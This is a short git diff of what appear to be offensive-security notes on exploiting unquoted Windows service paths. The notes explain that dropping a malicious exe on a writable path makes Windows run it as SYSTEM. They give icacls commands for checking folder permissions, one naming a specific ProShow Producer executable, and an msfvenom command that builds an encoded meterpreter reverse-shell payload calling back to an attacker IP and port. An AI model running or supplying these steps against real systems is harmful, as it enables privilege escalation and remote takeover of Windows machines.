@@ -13,11 +13,11 @@ C:\Program Files (x86)\Program.exe
 C:\Program Files (x86)\Program Folder\A.exe
 C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
 ```
-If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM.
-
-In order to check the permissions of a folder
+If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM.In order to check the permissions of a folder
+```
 icacls "C:\Program Files (x86)\Program Folder"
-
+icacls "C:\Program Files\Photodex\ProShow Producer\Scsiaccess.exe"
+```
 
 
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
